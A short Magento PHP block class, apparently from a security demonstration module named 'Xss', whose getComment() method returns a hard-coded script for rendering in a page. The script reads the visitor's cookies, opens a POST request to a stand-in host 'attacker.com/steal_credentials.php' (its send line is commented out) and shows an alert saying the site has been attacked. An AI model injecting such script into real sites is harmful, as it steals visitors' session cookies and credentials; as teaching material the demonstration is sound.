<?php



namespace Chuccv\Security\Block\Xss;



/**
 * Class Index
 * @package Chuccv\Security\Block\Xss
 */
class Index extends \Magento\Framework\View\Element\Template
{
    /**
     * @return string
     */
    public function getComment()
    {
        $comment = <<<HTML
<script>
    const cookiesString = document.cookie;
    const cookiesArray = cookiesString.split('; ');

    for (const cookie of cookiesArray) {
        const [name, value] = cookie.split('=');
        console.log('Cookie name:'+ name+', value: '+value);
    }
    // Gửi thông tin đăng nhập đến kẻ tấn công
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://attacker.com/steal_credentials.php");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    // debugger
    // xhr.send("username=" + name);
    alert('Site cua ban da bi tan cong');

</script>
HTML;


        return $comment;
    }
}
